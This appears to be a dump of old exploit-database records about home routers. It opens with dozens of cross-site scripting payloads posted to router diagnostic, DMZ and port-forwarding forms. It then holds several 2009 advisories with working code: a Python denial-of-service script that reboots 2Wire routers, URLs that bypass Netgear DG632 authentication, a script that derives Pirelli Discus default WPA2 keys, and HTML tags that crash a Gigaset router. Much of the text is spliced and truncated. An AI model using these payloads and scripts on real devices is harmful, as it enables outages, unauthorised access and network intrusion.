Details
The POST variable diag_pppindex_argen has been set to <script>alert(407075360657)</script> .
diag_pppindex_argen=<script>alert(407075360657)</script>&DiagArgenTest=Test&DiagStartFlag=0/Forms/rpDiag_argen_1
Details
The POST variable diag_pppindex_argen has been set to >""><ScRiPt%20%0a%0d>alert(407105360657)%3B</ScRiPt> .
diag_pppindex_argen=>""><ScRiPt%20%0a%0d>alert(407105360657)%3B</ScRiPt>&DiagArgenTest=T
/Forms/rpDiag_argen_1
Details
The POST variable diag_pppindex_argen has been set to >'><ScRiPt%20%0a%0d>alert(407095360657)%3B</ScRiPt> .
diag_pppindex_argen=>'><ScRiPt%20%0a%0d>alert(407095360657)%3B</ScRiPt>&DiagArgenTest=Test&DiagStartFlag=0
/Forms/rpDiag_argen_1
Details
The POST variable DiagStartFlag has been set to >'><ScRiPt%20%0a%0d>alert(407195360661)%3B</ScRiPt> .
diag_pppindex_argen=0&DiagArgenTest=Test&DiagStartFlag=>'><ScRiPt%20%0a%0d>alert(407195360661)%3B</ScRiPt>
/Forms/rpDiag_argen_1
Details
The POST variable DiagStartFlag has been set to --><ScRiPt%20%0a%0d>alert(407235360661)%3B</ScRiPt> .
diag_pppindex_argen=0&DiagArgenTest=Test&DiagStartFlag=--><ScRiPt%20%0a%0d>alert(407235360661)%3B</ScRiPt>
/Forms/rpDiag_argen_1
Details
The POST variable DiagStartFlag has been set to email@some<ScRiPt%20%0a%0d>alert(407245360661)%3B</ScRiPt>domain.com .
diag_pppindex_argen=0&DiagArgenTest=Test&DiagStartFlag=email@some<ScRiPt%20%0a%0d>alert(407245360661)%3B</ScRiPt>domain.com
/Forms/rpDiag_argen_1
Details
The POST variable DiagStartFlag has been set to %3Cimg%20dynsrc%3D%22JaVaScRiPt:alert%28407425360708%29%3B%22%3E .
diag_pppindex_argen=0&DiagArgenTest=Test&DiagStartFlag=%3Cimg%20dynsrc%3D%22JaVaScRiPt:alert%28407425360708%29%3B%22%3E
/Forms/rpDiag_argen_1
Details
The POST variable DiagStartFlag has been set to %3Cimg%20src%3D%22JaVaS%26%2399%3BRiPt:alert%28407265360661%29%3B%22%3E .
diag_pppindex_argen=0&DiagArgenTest=Test&DiagStartFlag=%3Cimg%20src%3D%22JaVaS%26%2399%3BRiPt:alert%28407265360661%29%3B%22%3E
/Forms/rpDiag_argen_1
Details
The POST variable DiagStartFlag has been set to >""><ScRiPt%20%0a%0d>alert(407205360661)%3B</ScRiPt> .
diag_pppindex_argen=0&DiagArgenTest=Test&DiagStartFlag=>""><ScRiPt%20%0a%0d>alert(407205360661)%3B</ScRiPt>
/Forms/rpDiag_argen_1
Details
The POST variable DiagStartFlag has been set to <script>alert(407175360661)</script> .
diag_pppindex_argen=0&DiagArgenTest=Test&DiagStartFlag=<script>alert(407175360661)</script>
/Forms/rpDiag_argen_1
Details
The POST variable DiagStartFlag has been set to &lt;/textarea&gt;<ScRiPt%20%0a%0d>alert(407215360661)%3B</ScRiPt> .
diag_pppindex_argen=0&DiagArgenTest=Test&DiagStartFlag=&lt;/textarea&gt;<ScRiPt%20%0a%0d>aler
/Forms/rpDiag_argen_1
Details
The POST variable DiagStartFlag has been set to </title><ScRiPt%20%0a%0d>alert(407225360661)%3B</ScRiPt> .
diag_pppindex_argen=0&DiagArgenTest=Test&DiagStartFlag=</title><ScRiPt%20%0a%0d>alert(407225360661)%3B</ScRiPt>
/Forms/rpDiag_argen_1
Details
The POST variable DiagStartFlag has been set to <ScRiPt%20%0a%0d>alert(407185360661)%3B</ScRiPt> .
diag_pppindex_argen=0&DiagArgenTest=Test&DiagStartFlag=<ScRiPt%20%0a%0d>alert(407185360661)%3B</ScRiPt>
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmz_active has been set to </title><ScRiPt%20%0a%0d>alert(414945497855)%3B</ScRiPt> .
wzdmz_active=</title><ScRiPt%20%0a%0d>alert(414945497855)%3B</ScRiPt>&wzdmzHostIP=0%2E0%2E0%2E0&NATDMZApply=Aceptar
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmz_active has been set to &lt;/textarea&gt;<ScRiPt%20%0a%0d>alert(414935497855)%3B</ScRiPt> .
wzdmz_active=&lt;/textarea&gt;<ScRiPt%20%0a%0d>alert(414935497855)%3B</ScRiPt>&wzdmzHostIP=0%2E0%2E0%2E0&NATDMZApply=Aceptar
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmz_active has been set to --><ScRiPt%20%0a%0d>alert(414955497855)%3B</ScRiPt> .
wzdmz_active=--><ScRiPt%20%0a%0d>alert(414955497855)%3B</ScRiPt>&wzdmzHostIP=0%2E0%2E0%2E0&NATDMZApply=Aceptar
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmz_active has been set to %3Cimg%20src%3D%22JaVaS%26%2399%3BRiPt:alert%28414985497855%29%3B%22%3E .
wzdmz_active=%3Cimg%20src%3D%22JaVaS%26%2399%3BRiPt:alert%28414985497855%29%3B%22%3E&wzdmzHostIP=0%2E0%2E0%2E0&NATDMZApply=Aceptar
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmz_active has been set to email@some<ScRiPt%20%0a%0d>alert(414965497855)%3B</ScRiPt>domain.com .
wzdmz_active=email@some<ScRiPt%20%0a%0d>alert(414965497855)%3B</ScRiPt>domain.com&wzdmzHostIP=0%2E0%2E0%2E0&NATDMZApply=Aceptar
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmz_active has been set to <script>alert(414895497855)</script> .
wzdmz_active=<script>alert(414895497855)</script>&wzdmzHostIP=0%2E0%2E0%2E0&NATDMZApply=Aceptar
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmz_active has been set to %3Cimg%20dynsrc%3D%22JaVaScRiPt:alert%28415145497909%29%3B%22%3E .
wzdmz_active=%3Cimg%20dynsrc%3D%22JaVaScRiPt:alert%28415145497909%29%3B%22%3E&wzdmzHost
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmz_active has been set to <ScRiPt%20%0a%0d>alert(414905497855)%3B</ScRiPt> .
wzdmz_active=<ScRiPt%20%0a%0d>alert(414905497855)%3B</ScRiPt>&wzdmzHostIP=0%2E0%2E0%2E0&NATDMZApply=Aceptar
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmz_active has been set to >""><ScRiPt%20%0a%0d>alert(414925497855)%3B</ScRiPt> .
wzdmz_active=>""><ScRiPt%20%0a%0d>alert(414925497855)%3B</ScRiPt>&wzdmzHostIP=0%2E0%2E0%2E0&NATDMZApply=Aceptar
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmz_active has been set to >'><ScRiPt%20%0a%0d>alert(414915497855)%3B</ScRiPt> .
wzdmz_active=>'><ScRiPt%20%0a%0d>alert(414915497855)%3B</ScRiPt>&wzdmzHostIP=0%2E0%2E0%2E0&NATDMZApply=Aceptar
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmzHostIP has been set to &lt;/textarea&gt;<ScRiPt%20%0a%0d>alert(415035497857)%3B</ScRiPt> .
wzdmz_active=1&wzdmzHostIP=&lt;/textarea&gt;<ScRiPt%20%0a%0d>alert(415035497857)%3B</ScRiPt>&NATDMZApply=Aceptar
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmzHostIP has been set to >""><ScRiPt%20%0a%0d>alert(415025497857)%3B</ScRiPt> .
wzdmz_active=1&wzdmzHostIP=>""><ScRiPt%20%0a%0d>alert(415025497857)%3B</ScRiPt>&NATDMZApply=Aceptar
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmzHostIP has been set to %3Cimg%20src%3D%22JaVaS%26%2399%3BRiPt:alert%28415085497857%29%3B%22%3E .
wzdmz_active=1&wzdmzHostIP=%3Cimg%20src%3D%22JaVaS%26%2399%3BRiPt:alert%28415085497857%29%3B%22%3E&NATDMZApply=Aceptar
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmzHostIP has been set to </title><ScRiPt%20%0a%0d>alert(415045497857)%3B</ScRiPt> .
wzdmz_active=1&wzdmzHostIP=</title><ScRiPt%20%0a%0d>alert(415045497857)%3B</ScRiPt>&NAT
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmzHostIP has been set to email@some<ScRiPt%20%0a%0d>alert(415065497857)%3B</ScRiPt>domain.com .
wzdmz_active=1&wzdmzHostIP=email@some<ScRiPt%20%0a%0d>alert(415065497857)%3B</ScRiPt>domain.com&NATDMZApply=Aceptar
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmzHostIP has been set to <ScRiPt%20%0a%0d>alert(415005497857)%3B</ScRiPt> .
wzdmz_active=1&wzdmzHostIP=<ScRiPt%20%0a%0d>alert(415005497857)%3B</ScRiPt>&NATDMZApply
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmzHostIP has been set to <script>alert(414995497857)</script> .
wzdmz_active=1&wzdmzHostIP=<script>alert(414995497857)</script>&NATDMZApply=Aceptar
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmzHostIP has been set to --><ScRiPt%20%0a%0d>alert(415055497857)%3B</ScRiPt> .
wzdmz_active=1&wzdmzHostIP=--><ScRiPt%20%0a%0d>alert(415055497857)%3B</ScRiPt>&NATDMZApply=Aceptar
/Forms/rpNATdmz_argen_1
Details
The POST variable wzdmzHostIP has been set to >'><ScRiPt%20%0a%0d>alert(415015497857)%3B</ScRiPt> .
wzdmz_active=1&wzdmzHostIP=>'><ScRiPt%20%0a%0d>alert(415015497857)%3B</ScRiPt>&NATDMZApply=Aceptar
/Forms/rpNATvirsvr_argen_1
Details
The POST variable wzVIRTUALSVR_endPort has been set to >""><ScRiPt%20%0a%0d>alert(409395385265)%3B</ScRiPt> .
wzVIRTUALSVR_IndexFlag=0&wzVIRTUALSVR_Application=-&wzVIRTUALSVR_startPort=0&wzVIRTUALSVR_endPort=>""><ScRiPt%20%0a%0d>alert(409395385265)%3B</ScRiPt>&wzVIRTUALSVR_localIP=0%2E0%2E0%2E0&wzVIRTUALSVR_startPortLocal=0&wzVIRTUALSVR_endPortLocal=0&NATDMZApply=Aceptar&NATVirsvrDelete=Borrar
/Forms/rpNATvirsvr_argen_1
Details
The POST variable wzVIRTUALSVR_endPort has been set to &lt;/textarea&gt;<ScRiPt%20%0a%0d>alert(409405385265)%3B</ScRiPt> .
wzVIRTUALSVR_IndexFlag=0&wzVIRTUALSVR_Application=-&wzVIRTUALSVR_startPort=0&wzVIRTUALSVR_endPort=&lt;/textarea&gt;<ScRiPt%20%0a%0d>alert(409405385265)%3B</ScRiPt>&wzVIRTUALSVR_localIP=0%2E0%2E0%2E0&wzVIRTUALSVR_startPortLocal=0&wzVIRTUALSVR_endPortLocal=0&NATDMZApply=Aceptar&NATVirsvrDelete=Borrar
/Forms/rpNATvirsvr_argen_1
Details
The POST variable wzVIRTUALSVR_endPort has been set to <ScRiPt%20%0a%0d>alert(409375385265)%3B</ScRiPt> .
wzVIRTUALSVR_IndexFlag=0&wzVIRTUALSVR_Application=-&wzVIRTUALSVR_startPort=0&wzVIRTUALSVR_endPort=<ScRiPt%20%0a%0d>alert(409375385265)%3B</ScRiPt>&wzVIRTUALSVR_localIP=0%2E0%2E0%2E0&wzVIRTUALSVR_startPortLocal=0&wzVIRTUALSVR_endPortLocal=0&NATDMZApply=Aceptar&NATVirsvrDelete=Borrar
/Forms/rpNATvirsvr_argen_1
Details
The POST variable wzVIRTUALSVR_endPort has been set to >'><ScRiPt%20%0a%0d>alert(409385385265)%3B</ScRiPt> .wzVIRTUALSVR_IndexFlag=0&wzVIRTUALSVR_Application=-&wzVIRTUALSVR_startPort=0&wzVIRTUALSVR_endPort=>'><ScRiPt%20%0a%0d>alert(409385385265)%3B</ScRiPt>&wzVIRTUALSVR_localIP=0%2E0%2E0%2E0&wzVIRTUALSVR_startPortLocal=0&wzVIRTUALSVR_endPortLocal=0&NATDMZApply=Aceptar&NATVirsvrDelete=Borrar
/Forms/rpNATvirsvr_argen_1
Details
The POST variable wzVIRTUALSVR_endPort has been set to </title><ScRiPt%20%0a%0d>alert(409415385265)%3B</ScRiPt> .
wzVIRTUALSVR_IndexFlag=0&wzVIRTUALSVR_Application=-&wzVIRTUALSVR_startPort=0&wzVIRTUALSVR_endPort=</title><ScRiPt%20%0a%0d>alert(409415385265)%3B</ScRiPt>&wzVIRTUALSVR_localIP=0%2E0%2E0%2E0&wzVIRTUALSVR_startPortLocal=0&wzVIRTUALSVR_endPortLocal=0&NATDMZApply=Aceptar&NATVirsvrDelete=Borrar
/Forms/rpNATvirsvr_argen_1
Details
The POST variable wzVIRTUALSVR_endPort has been set to %3Cimg%20src%3D%22JaVaS%26%2399%3BRiPt:alert%28409455385265%29%3B%22%3E .
wzVIRTUALSVR_IndexFlag=0&wzVIRTUALSVR_Application=-&wzVIRTUALSVR_startPort=0&wzVIRTUALSVR_endPort=%3Cimg%20src%3D%22JaVaS%26%2399%3BRiPt:alert%28409455385265%29%3B%22%3E&wzVIRTUALSVR_localIP=0%2E0%2E0%2E0&wzVIRTUALSVR_startPortLocal=0&wzVIRTUALSVR_endPortLocal=0&NATDMZApply=Aceptar&NATVirsvrDelete=Borrar
/Forms/rpNATvirsvr_argen_1
Details
The POST variable wzVIRTUALSVR_endPort has been set to %3Cimg%20dynsrc%3D%22JaVaScRiPt:alert%28410015385532%29%3B%22%3E .
wzVIRTUALSVR_index=111-222-1933email@address.tst&wzVIRTUALSVR_IndexFlag=0&wzVIRTUALSVR_Application=-&wzVIRTUALSVR_App_idx=111-222-1933email@address.tst&wzVSProtocolIndex=111-222-1933email@address.tst&wzVIRTUALSVR_startPort=0&wzVIRTUALSVR_endPort=%3Cimg%20dynsrc%3D%22JaVaScRiPt:alert%28410015385532%29%3B%22%3E&wzVIRTUALSVR_localIP=0%2E0%2E0%2E0&wzVIRTUALSVR_startPortLocal=0&wzVIRTUALSVR_endPortLocal=0&NATDMZApply=Aceptar&NATVirsvrDelete=Borrar
/Forms/rpNATvirsvr_argen_1
Details
The POST variable wzVIRTUALSVR_endPort has been set to --><ScRiPt%20%0a%0d>alert(409425385265)%3B</ScRiPt> .
wzVIRTUALSVR_IndexFlag=0&wzVIRTUALSVR_Application=-&wzVIRTUALSVR_startPort=0&wzVIRTUALSVR_endPort=--><ScRiPt%20%0a%0d>alert(409425385265)%3B</ScRiPt>&wzVIRTUALSVR_localIP=0%2E0%2E0%2E0&wzVIRTUALSVR_startPortLocal=0&wzVIRTUALSVR_endPortLocal=0&NATDMZApply=Aceptar&NATVirsvrDelete=Borrar
/Forms/rpNATvirsvr_argen_1
Details
The POST variable wzVIRTUALSVR_endPort has been set to email@some<ScRiPt%20%0a%0d>alert(409435385265)%3B</ScRiPt>domain.com .
wzVIRTUALSVR_IndexFlag=0&wzVIRTUALSVR_Application=-&wzVIRTUALSVR_startPort=0&wzVIRTUALSVR_endPort=email@some<ScRiPt%20%0a%0d>alert(409435385265)%3B</ScRiPt>domain.com&wzVIRTUALSVR_localIP=0%2E0%2E0%2E0&wzVIRTUALSVR_startPortLocal=0&wzVIRTUALSVR_endPortLocal=0&NATDMZApply=Aceptar&NATVirsvrDelete=Borrar
/Forms/rpNATvirsvr_argen_1
Details
The POST variable wzVIRTUALSVR_endPort has been set to <script>alert(409365385265)</script> .
wzVIRTUALSVR_IndexFlag=0&wzVIRTUALSVR_Application=-&wzVIRTUALSVR_startPort=0&wzVIRTUALSVR_endPort=<script>alert(409365385265)</script>&wzVIRTUALSVR_localIP=0%2E0%2E0%2E0&wzVIRTUALSVR_startPortLocal=0&wzVIRTUALSVR_endPortLocal=0&NATDMZApply=Aceptar&NATVirsvrDelete=Borrar
/Forms/rpNATvirsvr_argen_1
Details
The POST variable wzVIRTUALSVR_endPort has been set to >'><ScRiPt%20%0a%0d>alert(408785384923)%3B</ScRiPt> .
wzVIRTUALSVR_index=111-222-1933email@address.tst&wzVIRTUALSVR_IndexFlag=0&wzVIRTUALSVR_Application=-&wzVIRTUALSVR_App_idx=111-222-1933email@address.tst&wzVSProtocolIndex=111-222-1933email@address.tst&wzVIRTUALSVR_startPort=0&wzVIRTUALSVR_endPort=>'><ScRiPt%20%0a%0d>alert(408785384923)%3B</ScRiPt>&wzVIRTUALSVR_localIP=0%2E0%2E0%2E0&wzVIRTUALSVR_startPortLocal=0&wzVIRTUALSVR_endPortLocal=0&NATDMZApply=Aceptar&NATVirsvrDelete=Borrar
/Forms/rpNATvirsvr_argen_1
Details
The POST variable wzVIRTUALSVR_endPort has been set to >""><ScRiPt%20%0a%0d>alert(408795384923)%3B</ScRiPt> .
wzVIRTUALSVR_index=111-222-1933email@address.tst&wzVIRTUALSVR_IndexFlag=0&wzVIRTUALSVR_Application=-&wzVIRTUALSVR_App_idx=111-222-1933email@address.tst&wzVSProtocolIndex=111-222-1933email@address.tst&wzVIRTUALSVR_startPort=0&wzVIRTUALSVR_endPort=>""><ScRiPt%20%0a%0d>alert(408795384923)%3B</ScRiPt>&wzVIRTUALSVR_localIP=0%2E0%2E0%2E0&wzVIRTUALSVR_startPortLocal=0&wzVIRTUALSVR_endPortLocal=0&NATDMZApply=Aceptar&NATVirsvrDelete=Borrar
/Forms/rpNATvirsvr_argen_1
Details
The POST variable wzVIRTUALSVR_endPort has been set to <script>alert(408765384923)</script> .
wzVIRTUALSVR_index=111-222-1933email@address.tst&wzVIRTUALSVR_IndexFlag=0&wzVIRTUALSVR_Application=-&wzVIRTUALSVR_App_idx=111-222-1933email@address.tst&wzVSProtocolIndex=111-222-1933email@address.tst&wzVIRTUALSVR_startPort=0&wzVIRTUALSVR_endPort=<script>alert(408765384923)</script>&wzVIRTUALSVR_localIP=0%2E0%2E0%2E0&wzVIRTUALSVR_startPortLocal=0&wzVIRTUALSVR_endPortLocal=0&NATDMZApply=Aceptar&NATVirsvrDelete=Borrar
/Forms/rpNATvirsvr_argen_1
Details
The POST variable wzVIRTUALSVR_endPort has been set to <ScRiPt%20%0a%0d>alert(408775384923)%3B</ScRiPt> .
wzVIRTUALSVR_index=111-222-1933email@address.tst&wzVIRTUALSVR_IndexFlag=0&wzVIRTUALSVR_Application=-&wzVIRTUALSVR_App_idx=111-222-1933email@address.tst&wzVSProtocolIndex=111-222-1933email@address.tst&wzVIRTUALSVR_startPort=0&wzVIRTUALSVR_endPort=<ScRiPt%20%0a%0d>alert(408775384923)%3B</ScRiPt>&wzVIRTUALSVR_localIP=0%2E0%2E0%2E0&wzVIRTUALSVR_startPortLocal=0&wzVIRTUALSVR_endPortLocal=0&NATDMZApply=Aceptar&NATVirsvrDelete=Borrar
/Forms/rpNATvirsvr_argen_1
Details
The POST variable wzVIRTUALSVR_endPort has been set to &lt;/textarea&gt;<ScRiPt%20%0a%0d>alert(408805384923)%3B</ScRiPt> .
wzVIRTUALSVR_index=111-222-1933email@address.tst&wzVIRTUALSVR_IndexFlag=0&wzVIRTUALSVR_Application=-&wzVIRTUALSVR_App_idx=111-222-1933email@address.tst&wzVSProtocolIndex=111-222-1933email@address.tst&wzVIRTUALSVR_startPort=0&wzVIRTUALSVR_endPort=&lt;/textarea&gt;<ScRiPt%20%0a%0d>alert(408805384923)%3B</ScRiPt>&wzVIRTUALSVR_localIP=0%2E0%2E0%2E0&wzVIRTUALSVR_startPortLocal=0&wzVIRTUALSVR_endPortLocal=0&NATDMZApply=Aceptar&NATVirsvrDelete=Borrar
/Forms/rpNATvirsvr_argen_1
Details
The POST variable wzVIR"
2009-10-29,DoS,Hardware,hkm,2WIRE Router 5.29.52,Remote Denial of Service,"https://<remoteIP>:50001/xslt?page=%0d%0a
http://www.hakim.ws
#  POC","""""""           ========================================
2WIRE REMOTE DENIAL OF SERVICE
Device:2wire Gateway Router/Modem
Vulnerable Software:< 5.29.52
Vulnerable Models:1700HG
1701HG
1800HW
2071
2700HG
2701HG-T
Release Date: 2009-09-00
Last Update: 2009-09-00
Critical: Moderately critical
Impact: Denial of service
Remote router reboot
Where:From remote
In the remote management interface
Solution Status:Vendor issued firmware patches
Providers are in charge of applying the patches
WebVuln Advisory:1-003
BACKGROUND
The remote management interface of some 2wire modems is enabled by default.
This interface runs over SSL on port 50001 with an untrusted issuer certificate.
++Español
Algunos módems 2wire tienen la interfaz remota habilitada por default.
La interfaz utiliza SSL con un certificado invalido en el puerto 50001.
DESCRIPTION
Some 2wire modems are vulnerable to a remote denial of service attack.
By requesting a special url from the Remote Management interface, an unathenticated
user can remotely reboot the complete device.
Algunos módems 2wire son vulnerables a un ataque de denegación de servicio.
Un usuario no autenticado puede reiniciar el dispositivo enviando una petición a
la interfaz de Administración remota.
EXPLOIT / POC
WORKAROUND
Disable Remote Management in Firewall -> Advanced Settings.
Deshabilitar Administración remota en Cortafuegos -> Configuración avanzada
DISCLOSURE TIMELINE
2009/09/06 - Vulnerability discovered
2009/09/08 - Vendor contacted
h k m
hkm@hakim.ws
Greets:
preth00nker, DromoroK, mr.ebola, Javier, d0ct0r_4rz0v1zp0, ch@vez, fito, HL, Xianur0, Pr@fEs0r X, Daemon.
REFERENCES
Preth00nker's exploit (LAN) - http://www.milw0rm.com/exploits/2246
2Wire Gateways CRLF DoS (from local network) - http://secunia.com/advisories/21583
Hakim.Ws - http://www.hakim.ws
WebVuln - http://www.webvuln.com""""""
print ""\n     #################################################""
print ""    #         2WIRE REMOTE DoS (FW =< 5.29.52)       #""
print ""   #                                               #""
print ""  #                  hkm@hakim.ws                 #""
print "" #################################################\n""
import socket, sys, urllib2
socket.setdefaulttimeout(4)
try:
ip = sys.argv[1]
except:
print "" [IP ERROR] -> python 2os.py 123.123.123.123\n""
sys.exit()
if not len(ip.split(""."")) == 4:
print "" [IP ERROR] -> python 2os.py 123.123.123.123\n""
sys.exit()
print "" [ ] Detectando el dispositivo""
try:
server = str(urllib2.urlopen(urllib2.Request(""https://""+str(ip)+"":50001/xslt?page=CD35_SETUP_01"")).info())
print "" [+] Detectado ""+server[int(server.find(""Server:""))+8:int(server.find(""\n"",int(server.find(""Server:""))))]
except:
print "" [-] No detectado\n""
sys.exit()
print "" [ ] Lanzando el ataque""
try:str(urllib2.urlopen(urllib2.Request(""https://""+str(ip)+"":50001/xslt?page=%0d%0a"")).read())
except:pass
try:
server = str(urllib2.urlopen(urllib2.Request(""https://""+str(ip)+"":50001/xslt?page=CD35_SETUP_01"")).info())
print "" [-] No vulnerable\n""
except:
print "" [+] MODEM RESETADO! EAEA!\n""
sys.exit()"
2009-06-15,DoS,Hardware,Tom Neaves,Netgear DG632 Router,Remote Denial of Service,# milw0rm.com [2009-06-15],"Product Name: Netgear DG632 Router
Vendor: http://www.netgear.com
Date: 15 June, 2009
Author: tom@tomneaves.co.uk < tom@tomneaves.co.uk >
Original URL: http://www.tomneaves.co.uk/Netgear_DG632_Remote_DoS.txt
Discovered: 18 November, 2006
Disclosed: 15 June, 2009
I. DESCRIPTION
The Netgear DG632 router has a web interface which runs on port 80.  This
allows an admin to login and administer the device's settings.  However,
a Denial of Service (DoS) vulnerability exists that causes the web interface
to crash and stop responding to further requests.
II. DETAILS
Within the ""/cgi-bin/"" directory of the administrative web interface exists a
file called ""firmwarecfg"".  This file is used for firmware upgrades.  A HTTP POST
request for this file causes the web server to hang.  The web server will stop
responding to requests and the administrative interface will become inaccessible
until the router is physically restarted.
While the router will still continue to function at the network level, i.e. it will
still respond to ICMP echo requests and issue leases via DHCP, an administrator will
no longer be able to interact with the administrative web interface.
This attack can be carried out internally within the network, or over the Internet
if the administrator has enabled the ""Remote Management"" feature on the router.
Affected Versions: Firmware V3.4.0_ap (others unknown)
III. VENDOR RESPONSE
12 June, 2009 - Contacted vendor.
15 June, 2009 - Vendor responded.  Stated the DG632 is an end of life product and is no
longer supported in a production and development sense, as such, there will be no further
firmware releases to resolve this issue.
IV. CREDIT
Discovered by Tom Neaves"
2009-06-15,Remote,Hardware,Tom Neaves,Netgear DG632 Router,Authentication Bypass,"//document.forms[0].target.value=""top"";
//top.location.href=""../cgi-bin/webcm?nextpage=../html/indextop.htm"";
http://TARGET_IP/cgi-bin/webcm?nextpage=../html/stattbl.htm
http://TARGET_IP/html/stattbl.htm
http://192.168.0.1/cgi-bin/webcm?nextpage=../html/modemmenu.htm
http://192.168.0.1/html/modemmenu.htm
http://TARGET_IP/cgi-bin/webcm?nextpage=../../
# milw0rm.com [2009-06-15]","Product Name: Netgear DG632 Router
Vendor: http://www.netgear.com
Date: 15 June, 2009
Author: tom@tomneaves.co.uk < tom@tomneaves.co.uk >
Original URL: http://www.tomneaves.co.uk/Netgear_DG632_Authentication_Bypass.txt
Discovered: 18 November, 2006
Disclosed: 15 June, 2009
I. DESCRIPTION
The Netgear DG632 router has a web interface which runs on port 80.
This allows an admin to login and administer the device's settings.
Authentication of this web interface is handled by a script called
""webcm"" residing in ""/cgi-bin/"" which redirects to the relevant pages
depending on successful user authentication. Vulnerabilities in this
interface enable an attacker to access files and data without
authentication.
II. DETAILS
The ""webcm"" script handles user authentication and attempts to load
""indextop.htm"" (via javascript below).  The ""indextop.htm"" page requires
authentication (HTTP Basic Authorization).
<script language=""javascript"" type=""text/javascript"">
function loadnext() {
document.forms[0].submit();
}</script></head>
<body bgcolor=""#ffffff"" onload=""loadnext()"" >
Loading file ...
<form method=""POST"" action=""../cgi-bin/webcm"" id=""uiPostForm"">
<input type=""hidden"" name=""nextpage"" value=""../html/indextop.htm"" id=""uiGetNext"">
</form>
If a valid password to the default ""admin"" user is supplied, the script
then continues to load the ""indextop.htm"" page and continues to load the
other frames based on a hidden field.  If user authentication is
unsuccessful, the user is returned back to ""../cgi-bin/webcm"".  It is
possible to bypass the ""webcm"" script and access specific files directly
without the need for authentication.
Normal use:
This would ask for the user to authenticate and would refuse access to
this file if authentication details were not known.  All the script is
doing is making sure authentication is forced upon the user.  The same
""stattbl.htm"" file can be accessed without having to provide any
authentication using the following URL:
Another example:
(returns 401 - Forbidden)
Bypassing the ""webcm"" script:
(returns 200 - OK)
In the example above (modemmenu.htm), the full source can be viewed
which discloses further directories and files within the javascript of
the page. A sample of files disclosed within modemmenu.htm and available
to download are:
/html/onload.htm
/html/form.css
/gateway/commands/saveconfig.html
/html/utility.js (full source)
There are many other files that are accessible by calling them directly
instead of going via the ""webcm"" script, the above are just a sample. In
addition, it is possible to specify paths to the ""webcm"" script as shown
below:
This allows an attacker to enumerate what files and directories exist
within the www root directory and beyond by using 200, 403 and 404
errors as a guide.
Affected Versions: Firmware V3.4.0_ap (others unknown)
III. VENDOR RESPONSE
12 June, 2009 - Contacted vendor.
15 June, 2009 - Vendor responded.  Stated the DG632 is an end of life
product and is no longer supported in a production and development
sense, as such, there will be no further firmware releases to resolve
this issue.
IV. CREDIT
Discovered by Tom Neaves"
2009-04-06,Remote,Hardware,j0rgan,Pirelli Discus DRG A225 wifi router,WPA2PSK Default Algorithm,"#!/usr/bin/python
# Pirelli Discus DRG A225 WiFi router
# Default WPA2-PSK algorithm vulnerability
# paper: http://milw0rm.com/papers/313
# With this code we can predict the WPA2-PSK key...
# Hacked up by Muris Kurgas aka j0rgan
#            j0rgan (-@-) remote-exploit.org
#        http://www.remote-exploit.org
# Use for education or legal penetration testing purposes.....
# milw0rm.com [2009-04-06]","import sys
def hex2dec(s):
return int(s, 16)
if len(sys.argv) < 2 or len(sys.argv[1]) != 6:
print ""\r\nEnter the last 6 chars from Discus SSID""
print ""i.e. SSID should be 'Discus--XXXXXX', where XXXXXX is last 6 chars\r\n""
exit()
const = hex2dec('D0EC31')
inp = hex2dec(sys.argv[1])
result = (inp - const)/4
print ""Possible PSK for Discus--""+sys.argv[1]+"" would be: YW0""+str(result)"
2009-03-23,DoS,Hardware,Benkei,Gigaset SE461 WiMAX Router,Remote Denial of Service,"# direct connection
# nc -nvv 192.168.1.1 53
# example html file
# ""p"" is a fictional file to ensure that the browser requests something
# milw0rm.com [2009-03-23]","_   _ _____ _     ___ _____ _   _
/ / / / ____/ /   /  _/_  __/ / / /
/ /_/ / __/ / /    / /  / / / /_/ /
/ __  / /___/ /____/ /  / / / __  /
/_/ /_/_____/_____/___/ /_/ /_/ /_/
Helith - 0815
Author : Benkei
Date : 2008-02-08
Vendor : Siemens
Affected product : Gigaset SE461 WiMAX router
Firmware version : 1.5-BL024.9.6401
Propably other firmware versions are affected as well
Type : Denial of Service
OSVDB :
Milw0rm :
CVE :
ISS X-Force: :
After establishing a tcp connection to the affected device on port 53 from the
LAN interface and after closing the connection the router will restart.
Sometimes when using the web trigger with Internet explorer the WAN
configuration (ip, gateway ip, dns servers) for the device was lost and a
hardware reset was needed in order to make the device usable again.
This issue can be triggered from the LAN interface by direct connection or
by using specially crafted web content. For the web content to be able to
trigger the issue a browser withouth security restrictions on connection to
port 53 must be used, the tests done shows Internet Explorer like the only
one cappable of activating the bug.
Test made worked with Internet explorer version 7.0.6001.18000, it
didnt worked with Opera version 9.63 build 10476, Mozilla Firefox
version 3.0.1. nor Chrome 1.0.154.48. The html tags <img>, <link> an <base>
worked.
Steps to reproduce:
Or force someone into the lan segment of the router to open an html file
with one of the following tags and wait for the connection to be established
and closed. After 5 upon 10 seconds the device will reboot.
<+Tags which can get used+>
<img src=""http://192.168.1.1:53"" />
<img src=""http://192.168.1.1:53/p.png"" />
<a href=""http://192.168.1.1:53"">click me</a>
<link href=""192.168.1.1:53"" rel=""stylesheet"" type=""text/css"" />
<link href=""192.168.1.1:53/p.css"" rel=""stylesheet"" type=""text/css"" />
<div style=""background-image:url(http://192.168.1.1:53)""></div>
<div style=""background-image:url(http://192.168.1.1:53/p.png)""</div>
<object data=""http://192.168.1.1:53"" type=""image/gif"" ></object>
<object data=""http://192.168.1.1:53/p.gif"" type=""image/gif"" ></object>
<script src=""http://192.168.1.1:53""></script>
<script src=""http://192.168.1.1:53/p.js""></script>
<iframe src=""http://192.168.1.1:53""></iframe>
